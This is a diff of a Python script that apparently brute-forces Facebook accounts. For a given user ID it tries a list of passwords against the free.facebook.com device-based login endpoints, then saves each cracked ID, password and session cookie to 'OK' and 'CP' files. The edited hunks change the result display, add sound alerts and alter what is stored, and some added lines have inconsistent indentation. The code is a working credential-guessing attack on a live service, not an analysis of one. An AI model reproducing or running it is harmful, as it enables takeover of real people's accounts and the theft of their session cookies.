@@ -1105,6 +1105,7 @@ def _async(idf,pwv):
     for pw in pwv:
         pw = pw.lower()
         try:
+            if 'ya' in ualuh: ua = ualu[0]
             wibu = ses.get(f'https://free.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated').text
             data = {
 					"lsd": re.search('name="lsd" value="(.*?)"',str(wibu)).group(1),
@@ -1136,26 +1137,26 @@ def _async(idf,pwv):
 			}
             post = ses.post(f"https://free.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=wibu_head,allow_redirects=False)
             if "checkpoint" in post.cookies.get_dict().keys():
-                tree = Tree(Panel.fit(f"[yellow] LOGIN CHECKPOINT ",style=f"white"))
-                tree.add(Panel.fit(f"[yellow] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[yellow] {tahun(idf)} ",style=f"white"))
-                tree.add(Panel.fit(f"[yellow]{ua}",style=f"white"))
-                prints(tree)
-                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-                akun.append(idf+'|'+pw)
-                ceker(idf,pw)
-                cp+=1
-                break	
+		    cp+=1
+		    print('\n')
+		    statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+		    statuscp1 = nel(statuscp, width=80, style='bold yellow', title='CP')
+		    cetak(statuscp1)
+		    os.popen('play-audio c.mp3')
+		    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+		    akun.append(idf+'|'+pw)
+		    break
             elif "c_user" in ses.cookies.get_dict().keys():
-                ok+=1
-                coki=post.cookies.get_dict()
-                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                tree = Tree(Panel.fit(f"[green] LOGIN SUCKSES ",style=f"white"))
-                tree.add(Panel.fit(f"[green] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[green] {tahun(idf)} ",style=f"white"))
-                tree.add(Panel.fit(f"[green]{kuki}",style=f"white"))
-                tree.add(Panel.fit(f"[green]{ua}",style=f"white"))
-                prints(tree)
-                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-                break
+		    ok+=1
+		    coki=ses.cookies.get_dict()
+		    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+		    print('\n')
+		    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+		    statusok1 = nel(statusok, width=80, style='bold green', title='OK')
+		    cetak(statusok1)
+		    os.popen('play-audio o.mp3')
+		    open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+		    break
             else:continue
         except requests.exceptions.ConnectionError:time.sleep(31)
     loop+=1
